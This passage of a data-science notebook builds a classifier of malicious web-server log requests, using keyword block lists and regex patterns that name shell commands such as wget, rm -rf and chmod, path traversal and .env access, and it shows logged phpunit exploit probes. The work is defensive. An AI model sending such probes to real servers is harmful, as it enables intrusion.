        "bad_list_2 = [\n",
        "    'cgi', 'shell', 'die', '@md5', 'phpunit', '\\.env', '\\.sh', '\\.\\./',\n",
        "    'ls+', 'cd\\+', 'rm\\+', '\\-rf', 'wget', 'cmod', 'chown',\n",
        "    'ZINFO', 'fig', 'script', '<php', 'w00t', '\\=https'\n",
        "]"
      ],
      "execution_count": 30,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h4kazElHz_tr",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "0886a337-f5e3-4396-ae7e-0bb9e3cad363"
      },
      "source": [
        "bad_requests1 = get_bad_requests(dft, bad_list_1)\r\n",
        "bad_requests1.shape"
      ],
      "execution_count": 31,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(830, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 31
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "08n7XZxz0IFR",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "ec34927a-e1c6-4144-d26f-d7f28f178def"
      },
      "source": [
        "bad_requests2 = get_bad_requests(dft, bad_list_2)\r\n",
        "bad_requests2.shape"
      ],
      "execution_count": 32,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(1077, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 32
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tAqb8Y7y-UY_"
      },
      "source": [
        "## 3.2 Tests on filtering bad requests"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XoW09Z8y-UZA"
      },
      "source": [
        "### 3.2.1 Find malitious requests accessing *.php files"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "j46G5JdM-UZB"
      },
      "source": [
        "# php_requests = df.loc[df.request.str.contains('^.php')]\n",
        "# df.request.str.contains('^.php^')\n",
        "bad_php = df[df.request.str.contains('php', regex=True, na=False)]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "Cq-Oi1nj-UZF",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "38fd0888-6749-4851-89a2-26f898d54d20"
      },
      "source": [
        "bad_php.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(3114, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 26
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "x2SnUWI_-UZJ"
      },
      "source": [
        "### 3.2.2 Find malitiuos requests trying to execute shell commands"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fCbFjc29-UZK"
      },
      "source": [
        "bad_shell = df[df.request.str.contains('shell|cd\\+|rm\\+|\\-rf|wget\\+|chmod\\+|chown\\+|ls\\+', regex=True, na=False)]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "e0goe1X7-UZN",
        "outputId": "3be9f7c3-7ccf-42d2-f7c3-ed46c8a8e05c"
      },
      "source": [
        "bad_shell.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(34, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 80
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z62kILNL-UZR"
      },
      "source": [
        "### 3.2.3 Find malitious requests of CGI"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "yspTztkG-UZS"
      },
      "source": [
        "bad_cgi = df[df.request.str.contains('cgi', regex=True, na=False)]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "usRfWmpP-UZW",
        "outputId": "3dfdf06b-adf2-4fab-99e7-e80ad2bc33c7"
      },
      "source": [
        "bad_cgi.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(34, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 106
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "-Y03W9Uq-UZb"
      },
      "source": [
        "### 3.2.4 Other malitious"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "vaVnINw_-UZc"
      },
      "source": [
        "bad_other = df[df.request.str.contains('\\?index=|example\\.com|ZINFO|fig', regex=True, na=False)]"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "PruBDaGX-UZh",
        "outputId": "d4fcf917-0108-4639-b384-52440b4cebf1"
      },
      "source": [
        "bad_other.shape"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(69, 6)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 89
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "yhgw0SoK-UZl"
      },
      "source": [
        "## 3.3 Good requests"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "UpsG-f_E-UZm"
      },
      "source": [
        "good_requests1 = bad_requests1.merge(df, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']\n",
        "# good_requests2 = bad_requests2.merge(dft, how='outer', indicator=True).loc[lambda x : x['_merge']=='right_only']"
      ],
      "execution_count": 34,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "98wC5iqZ-UZp",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "e318b9e7-082e-450f-f4dd-efb3fa9acd75"
      },
      "source": [
        "good_requests1.shape"
      ],
      "execution_count": 35,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(8509, 7)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 35
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "r7TJ8Jc5-UZt",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "255ad217-11fe-4f0b-a05b-974d4e8cadc2"
      },
      "source": [
        "good_requests2.shape"
      ],
      "execution_count": 36,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(7821, 7)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 36
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "sWSVdA3x-UZx"
      },
      "source": [
        "# 4 Model"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "gzLcipNS-UZy"
      },
      "source": [
        "## 4.1 Splitting the date (training / validation)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "uTjhzLr2sG_e"
      },
      "source": [
        "yBad = [1 for i in range(0, len(bad_requests2))]  #labels, 1 for malicious and 0 for clean\n",
        "yGood = [0 for i in range(0, len(good_requests2))]"
      ],
      "execution_count": 37,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ppXHrhiZvrDl"
      },
      "source": [
        "dft['is_safe'] = dft.request.isin(good_requests2.request).astype(bool) # should it be bool?"
      ],
      "execution_count": 40,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KUcYB6qN0a7p",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 369
        },
        "outputId": "d97b53c5-c237-436c-a586-88c6d4576de3"
      },
      "source": [
        "dft.head(10)\n",
        "# dft['is_safe'].dtypes"
      ],
      "execution_count": 42,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>IP</th>\n",
              "      <th>date</th>\n",
              "      <th>request</th>\n",
              "      <th>code</th>\n",
              "      <th>body_bytes</th>\n",
              "      <th>agent</th>\n",
              "      <th>is_safe</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:07:27:21</td>\n",
              "      <td>GET /vendor/phpunit/phpunit/src/Util/PHP/eval-...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>199.195.254.38</td>\n",
              "      <td>26/Sep/2020:08:04:18</td>\n",
              "      <td>GET ../../proc/ HTTP</td>\n",
              "      <td>400</td>\n",
              "      <td>182</td>\n",
              "      <td>-</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>176.113.115.214</td>\n",
              "      <td>26/Sep/2020:08:07:45</td>\n",
              "      <td>POST /vendor/phpunit/phpunit/src/Util/PHP/eval...</td>\n",
              "      <td>404</td>\n",
              "      <td>209</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
              "      <td>False</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET /xmlrpc.php?rsd HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:34</td>\n",
              "      <td>GET / HTTP/1.1</td>\n",
              "      <td>200</td>\n",
              "      <td>13</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:35</td>\n",
              "      <td>GET /blog/robots.txt HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:35</td>\n",
              "      <td>GET /blog/ HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>9</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:35</td>\n",
              "      <td>GET /wordpress/ HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>156.146.36.72</td>\n",
              "      <td>26/Sep/2020:08:19:35</td>\n",
              "      <td>GET /wp/ HTTP/1.1</td>\n",
              "      <td>404</td>\n",
              "      <td>232</td>\n",
              "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:5...</td>\n",
              "      <td>True</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div>"
            ],
            "text/plain": [
              "                 IP  ... is_safe\n",
              "1   176.113.115.214  ...   False\n",
              "2    199.195.254.38  ...   False\n",
              "3   176.113.115.214  ...   False\n",
              "4     156.146.36.72  ...    True\n",
              "5     156.146.36.72  ...    True\n",
              "6     156.146.36.72  ...    True\n",
              "7     156.146.36.72  ...    True\n",
              "8     156.146.36.72  ...    True\n",
              "9     156.146.36.72  ...    True\n",
              "10    156.146.36.72  ...    True\n",
              "\n",
              "[10 rows x 7 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 42
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hITwjdoj21W8"
      },
      "source": [
        "queries = dft['request'].to_list()"
      ],
      "execution_count": 43,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "g2ui7jGb6VeP"
      },
      "source": [
        "y = dft['is_safe'].to_list()"
      ],
      "execution_count": 44,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "uF8u6TW1GQPa",
        "outputId": "177fffe0-24db-4e43-9ca7-10ffd1064318"
      },
      "source": [
        "len(y)"
      ],
      "execution_count": 45,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "8898"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 45
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "C7Z0CAouGcEL"
      },
      "source": [
        "# 50% split\r\n",
        "mid = int(len(y) / 2)\r\n",
        "mid\r\n",
        "trn_y = y[:mid]\r\n",
        "val_y = y[mid:]"
      ],
      "execution_count": 49,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cz38bCt1Fdj4",
        "outputId": "6e0b6dc9-f02e-4634-cf09-c851e0f67115"
      },
      "source": [
        "len(trn_y)"
      ],
      "execution_count": 51,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "4449"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 51
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "bfVinYsSt97n",
        "outputId": "931f6a1a-2047-4f26-c68b-1891b254b4fb"
      },
      "source": [
        "trn = queries[:mid]\r\n",
        "val = queries[mid:]\r\n",
        "len(queries), len(trn), len(val)"
      ],
      "execution_count": 52,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "(8898, 4449, 4449)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 52
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PLgDV38KtD1M"
      },
      "source": [
        "## 4.2 TfidfVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "92_RIl6gsFfY"
      },
      "source": [
        "vectorizer = TfidfVectorizer(\n",
        "    min_df=0.0, \n",
        "    analyzer=\"char\", \n",
        "    sublinear_tf=True, \n",
        "    ngram_range=(2,6))\n",
        "X = vectorizer.fit_transform(queries)"
      ],
      "execution_count": 61,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "h61KyJDt5kPq"
      },
      "source": [
        "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.5, random_state=42)"
      ],
      "execution_count": 62,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XHwmuuWB6lb2"
      },
      "source": [
        "lgs = LogisticRegression(class_weight={1: 2 * len(good_requests2) / len(bad_requests2), 0: 1.0})"
      ],
      "execution_count": 63,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ukpIxjUn6ylP",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "519fb262-570f-4809-8b35-8c83b2cd7e43"
      },
      "source": [
        "%%time\n",
        "lgs.fit(X_train, y_train)"
      ],
      "execution_count": 64,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 924 ms, sys: 1.4 s, total: 2.33 s\n",
            "Wall time: 1.23 s\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=1.0, class_weight={0: 1.0, 1: 14.52367688022284},\n",
              "                   dual=False, fit_intercept=True, intercept_scaling=1,\n",
              "                   l1_ratio=None, max_iter=100, multi_class='auto', n_jobs=None,\n",
              "                   penalty='l2', random_state=None, solver='lbfgs', tol=0.0001,\n",
              "                   verbose=0, warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 64
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nb4o5A7fs7BT"
      },
      "source": [
        "## 4.3 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "zSnZNVtVjn85"
      },
      "source": [
        "veczr = CountVectorizer(analyzer='char') #tokenizer=tokenize)"
      ],
      "execution_count": 57,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "m7aIl6khvQL4",
        "outputId": "c141bc44-5489-4962-ef9f-8ba7f259fe3e"
      },
      "source": [
        "%%time\r\n",
        "trn_term_doc = veczr.fit_transform(trn)\r\n",
        "val_term_doc = veczr.transform(val)"
      ],
      "execution_count": 58,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "CPU times: user 103 ms, sys: 426 µs, total: 103 ms\n",
            "Wall time: 104 ms\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "T7ifwoq9vWtm",
        "outputId": "b27172f6-af4b-4a37-986c-675375b96686"
      },
      "source": [
        "trn_term_doc"
      ],
      "execution_count": 59,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<4449x63 sparse matrix of type '<class 'numpy.int64'>'\n",
              "\twith 67763 stored elements in Compressed Sparse Row format>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 59
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "i2tvmwZcvhz-",
        "outputId": "fb534289-7a08-436c-c08c-71218a7fa24d"
      },
      "source": [
        "vocab = veczr.get_feature_names(); vocab[10:25]"
      ],
      "execution_count": 88,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', ';']"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 88
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ycfVt5ZsvtAC",
        "outputId": "91f7c1a8-9046-463f-a865-9a7a5d2a8f1c"
      },
      "source": [
        "w0 = set([o.lower() for o in trn[0].split(' ')]); w0"
      ],
      "execution_count": 66,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "{'/vendor/phpunit/phpunit/src/util/php/eval-stdin.php', 'get', 'http/1.1'}"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 66
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "xtg3El8N1xgy",
        "outputId": "235f64c5-fef7-4831-99ff-26208bbfca83"
      },
      "source": [
        "m = LogisticRegression(C=1e8)\r\n",
        "m.fit(trn_term_doc, y_train)"
      ],
      "execution_count": 67,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/linear_model/_logistic.py:940: ConvergenceWarning: lbfgs failed to converge (status=1):\n",
            "STOP: TOTAL NO. of ITERATIONS REACHED LIMIT.\n",
            "\n",
            "Increase the number of iterations (max_iter) or scale the data as shown in:\n",
            "    https://scikit-learn.org/stable/modules/preprocessing.html\n",
            "Please also refer to the documentation for alternative solver options:\n",
            "    https://scikit-learn.org/stable/modules/linear_model.html#logistic-regression\n",
            "  extra_warning_msg=_LOGISTIC_SOLVER_CONVERGENCE_MSG)\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "LogisticRegression(C=100000000.0, class_weight=None, dual=False,\n",
              "                   fit_intercept=True, intercept_scaling=1, l1_ratio=None,\n",
              "                   max_iter=100, multi_class='auto', n_jobs=None, penalty='l2',\n",
              "                   random_state=None, solver='lbfgs', tol=0.0001, verbose=0,\n",
              "                   warm_start=False)"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 67
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Z_zjX8Dy68K_"
      },
      "source": [
        "# 5 Evaluation"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "kQNugllw2YLp"
      },
      "source": [
        "## 5.1 tfidf vectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xN6EnjLCktcb"
      },
      "source": [
        "def print_score(m, df, pred, x_test, y_test):\r\n",
        "  fpr, tpr, _ = metrics.roc_curve(y_test, (m.predict_proba(x_test)[:, 1]))\r\n",
        "  auc = metrics.auc(fpr, tpr)\r\n",
        "  print(f\"All rows: {len(df.IP)}, bad request count: {len(bad_requests2)}\")\r\n",
        "  print(\"Baseline Constant negative: %.6f\" % (len(df.IP) / (len(df.IP) + len(bad_requests2))))\r\n",
        "  print(\"Accuracy: %f\" % lgs.score(x_test, y_test))  #checking the accuracy\r\n",
        "  print(\"Precision: %f\" % metrics.precision_score(y_test, predicted))\r\n",
        "  print(\"Recall: %f\" % metrics.recall_score(y_test, predicted))\r\n",
        "  print(\"F1-Score: %f\" % metrics.f1_score(y_test, predicted))\r\n",
        "  print(\"AUC: %f\" % auc)"
      ],
      "execution_count": 68,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "IbqjRyBK6-Kk"
      },
      "source": [
        "predicted = lgs.predict(X_test)"
      ],
      "execution_count": 69,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CILiWKkC7EFR"
      },
      "source": [
        "fpr, tpr, _ = metrics.roc_curve(y_test, (lgs.predict_proba(X_test)[:, 1]))\n",
        "auc = metrics.auc(fpr, tpr)"
      ],
      "execution_count": 70,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MeExFBTIlSev",
        "outputId": "a1914d5c-3266-4832-c0ae-ee5dcb374e51"
      },
      "source": [
        "print_score(lgs, dft, predicted, X_test, y_test)"
      ],
      "execution_count": 71,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "All rows: 8898, bad request count: 1077\n",
            "Baseline Constant negative: 0.892030\n",
            "Accuracy: 0.980445\n",
            "Precision: 0.978266\n",
            "Recall: 1.000000\n",
            "F1-Score: 0.989014\n",
            "AUC: 0.999667\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Rgox5hmT2ciu"
      },
      "source": [
        "## 5.2 CountVectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "huJi8SLc2la_",
        "outputId": "ff96d8f6-1005-4d27-ab02-ada882afd58b"
      },
      "source": [
        "preds = m.predict(val_term_doc)\r\n",
        "(preds==val_y).mean()"
      ],
      "execution_count": 72,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "0.8703079343672735"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 72
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XQdfqn-RkDYX"
      },
      "source": [
        "# 6 Parameter tuning"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Bdwa1XtLsBES"
      },
      "source": [
        "## 6.1 Tfidf vectorizer"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7UGiQwHlkE7C"
      },
      "source": [
        "# TODO pasisunkinti problema ir ja isspresti"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Oucy9qofsHZk"
      },
      "source": [
        "## 6.2 Count vectorizer"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Mht87EBdsxks"
      },
      "source": [
        "# 7 Pipeline"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8ve1BDUCs0B0"
      },
      "source": [
        "model_param=1e8\r\n",
        "vectrz_type='char'\r\n",
        "\r\n",
        "preprocessor = Pipeline(steps=[\r\n",
        "  ('vectorizer', CountVectorizer(analyzer=vectrz_type)),\r\n",
        "  ('trn_trm_doc', veczr.fit_transform(trn))\r\n",
        "])\r\n",
        "val_trm_doc = veczr.transform(val)\r\n",
        "my_pipe = Pipeline(steps=[\r\n",
        "  ('preproc', preprocessor)\r\n",
        "  ('model', LogisticRegression(C=model_param))\r\n",
        "])\r\n",
        "my_pipe.fit(trn_term_doc, y_train)\r\n",
        "preds = my_pipe.predict(val_term_doc)\r\n",
        "(preds==val_y).mean()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "OAae1Zmvyvji"
      },
      "source": [
        "pipeline = Pipeline([\r\n",
        "  ('vect', CountVectorizer()),\r\n",
        "  ('tfidf', TfidfTransformer()),\r\n",
        "  ('clf', SGDClassifier()),\r\n",
        "])"
      ],
      "execution_count": 81,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "AAuJUAOJzXcx"
      },
      "source": [
        "parameters = {\r\n",
        "  'vect__max_df': (0.5, 0.75, 1.0),\r\n",
        "  'vect__max_features': (None, 5000, 10000, 50000),\r\n",
        "  'vect__ngram_range': ((1, 3), (1, 6)),  # unigrams or bigrams\r\n",
        "  'tfidf__use_idf': (True, False),\r\n",
        "  'tfidf__norm': ('l1', 'l2'),\r\n",
        "  'clf__max_iter': (20,),\r\n",
        "  'clf__alpha': (0.00001, 0.000001),\r\n",
        "  'clf__penalty': ('l2', 'elasticnet'),\r\n",
        "  # 'clf__max_iter': (10, 50, 80),\r\n",
        "}"
      ],
      "execution_count": 89,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "oNamC06VjMdA"
      },
      "source": [
        "grid_search = GridSearchCV(pipeline, parameters, n_jobs=-1, verbose=1)"
      ],
      "execution_count": 90,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 459
        },
        "id": "T8sXVYXYjTGv",
        "outputId": "daf3222f-94b2-42dc-ff35-8b2bcb402be4"
      },
      "source": [
        "grid_search.fit(list(trn_term_doc), y_train)"
      ],
      "execution_count": 92,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Fitting 5 folds for each of 384 candidates, totalling 1920 fits\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[Parallel(n_jobs=-1)]: Using backend LokyBackend with 2 concurrent workers.\n",
            "[Parallel(n_jobs=-1)]: Done  46 tasks      | elapsed:   33.5s\n",
            "[Parallel(n_jobs=-1)]: Done 196 tasks      | elapsed:  2.4min\n",
            "[Parallel(n_jobs=-1)]: Done 446 tasks      | elapsed:  5.4min\n",
            "[Parallel(n_jobs=-1)]: Done 796 tasks      | elapsed:  9.6min\n",
            "[Parallel(n_jobs=-1)]: Done 1246 tasks      | elapsed: 15.1min\n",
            "[Parallel(n_jobs=-1)]: Done 1796 tasks      | elapsed: 21.7min\n",
            "[Parallel(n_jobs=-1)]: Done 1920 out of 1920 | elapsed: 23.2min finished\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "error",
          "ename": "AttributeError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mAttributeError\u001b[0m                            Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-92-6fb0f4700cc3>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mgrid_search\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mfit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mlist\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mtrn_term_doc\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0my_train\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
